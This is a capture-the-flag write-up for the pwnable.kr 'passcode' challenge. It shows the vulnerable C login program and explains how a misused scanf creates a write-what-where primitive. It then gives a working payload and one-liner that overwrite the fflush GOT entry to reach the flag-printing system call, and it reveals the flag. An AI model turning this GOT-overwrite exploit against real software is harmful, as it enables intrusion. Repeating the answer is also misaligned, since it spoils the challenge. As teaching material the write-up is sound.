# PASSCODE
This is the 5th challenge @ `pwnable.kr`
Let's Start!

In this challenge we get the source code of the binary.

## Source Code
Let's take a look at the source code:
```C
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

There is 2 vulnerabilities in the code (both are in the usage of the `scanf` function).
## Vulnerabilities + `scanf` usage
The `scanf` function allowing receiving  a string from the user, parse it to another type and save it to a variable.
For example, to get the age of someone:
```C
int age;
scanf("%d", &age);
```
- The user types an integer (e.g., `25`) and presses Enter.
- `scanf` stores this value in the memory location of `age`.
Nice, now let's take a look on the vulnerabilities:
### `maximum field width` - one byte (zero) buffer overflow
The first one (which is not helpful in our case) is a one byte buffer overflow in the `welcome` function.
```C
char name[100];
scanf("%100s", name);
```
We can look up the usage for the `scanf` function:
*An optional decimal integer which specifies the `maximum field width`. Reading of characters stops either when this maximum is reached or when a nonmatching character is found (space or null byte), whichever happens first. The maximum field width does not include this terminator.*
The buffer size needs to be `101` bytes long, and not `100` so it will be able to contain the additional null byte.
### pass by value vulnerability 
The second vulnerability is the other `scanf` usage:
```c
scanf("%d", passcode1);
```
Looks like the program forgot to use `&` to specify the pointer to `passcode1`! instead the program is passing the UNINITIALIZED value of `passcode1` into `scanf`. because the `scanf` function will write the input to the memory address - we might have a `Write-What-Where` gadget!
BTW. The right usage is:
```c
scanf("%d", &passcode1);
```
## Exploit!
Let's open the program in `GDB`, and disassemble `login`.
```sh
disass login
```
Let's check where the `passcode1` value is on the stack:
```sh
0x0804857c <+24>:	mov    -0x10(%ebp),%edx # this is passcode1 !
0x0804857f <+27>:	mov    %edx,0x4(%esp)
0x08048583 <+31>:	mov    %eax,(%esp)
0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
```
Looks like it is @ `$ebp-16` (`passcode2` is @ `$ebp-12`).
Let's add a break-point and run the program with the maximum input we can use:
```sh
break login
r
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
Let's check the stack (starting from `passcode1`):
```sh
x/16x $ebp-16
# 0xffffd068:	0x61616161	0xaaad4e00	0x080486a0	0xf7ffcb80
# 0xffffd078:	0xffffd098	0x08048684	0x080487f0	0x00000000
```
Wait. Looks like our input is right on the spot! We can control the `passcode1` value with our last 4 bytes of our input!
Because the `pasccode1` variable is not initialized, our first input is writing to it!
we got the `WRITE-WHAT-WHERE` primitive! Amazing!
Let's use it to jump to part of function which is printing the flag.

### Global Offset Table - `GOT`
Every dynamically-linked binary need to load the libraries at runtime. Therefore it must contain something to map the functions it is using to an actual address - and that is the `Global Offset Table`.
Basically if the attacker is changing the offset of one of the function at the table, anytime the function will be called, it will go to the new specified address.

With our `Write-What-Where` gadget, we can change the offset of a function!
But let's first check where we want to jump.
Once again, let's disassemble `login`.
```sh
disass login
```
I decided to jump to `0x080485de`, which is just above the `system` call:
```
0x080485de <+122>:	call   0x8048450 <puts@plt>
0x080485e3 <+127>:	movl   $0x80487af,(%esp)
0x080485ea <+134>:	call   0x8048460 <system@plt>
```
Nice, let's see what dynamically loaded functions are being called in the binary.
- `printf`
- `scanf`
- `fflush`
Let's get those addresses from the `GOT`:
```sh
readelf -r passcode
#  Offset     Info    Type            Sym.Value  Sym. Name
# 0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
# 0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
# 0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
# 0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
# 0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
# 0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
# 0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
# 0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
# 0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
```

| function name | address      |
| ------------- | ------------ |
| `printf`      | `0x0804a000` |
| `scanf`       | `0x0804a020` |
| `fflush`      | `0x0804a004` |
Remember that our input can't contain any null bytes (`\x00`) or any spaces (`\x20`).
the `printf` contains a null byte, and the `scanf` contains a space. which leaving us with the `fflush` function.
Let's build the exploit!

## Building the exploit
let's look on what we have:
- the last 4 bytes will be the value of `passcode1`
- `passcode1` is the address we want to re-write (because of the miss-usage with `scanf`)
- the call to `scanf` allowing us to write any 4 bytes to `passcode1` (which we control)
We can use it to change the offset of the `fflush` function in the `GOT`, to the address of system.
and that is it.
The payload should look something like this:
```python
payload = ''
payload += 'a'*96 # filler
payload += '\x04\xa0\x04\x08' # fflush address -> 0x0804a004
payload += '\n' # new line to end the `scanf`
payload += '134514142' # the decimal value of 0x080485de (right before the call to system)
payload += '\n' # new line to end the `scanf`
payload += '10' # just to fill passcode2
payload += '\n' # new line to end the `scanf`
```
and the one-liner exploit:
```bash
python -c "print 'a'*96+'\x04\xa0\x04\x08'+'\n134514142\n10\n'" | ./passcode
# Toddler's Secure Login System 1.0 beta.
# enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
# enter passcode1 : ���$�{������U�T$�$������$������}��(
# Sorry mom.. I got confused about scanf usage :(
# Now I can safely trust you that you have credential :)
```
Flag -> `Sorry mom.. I got confused about scanf usage :(`.
Happy Hacking!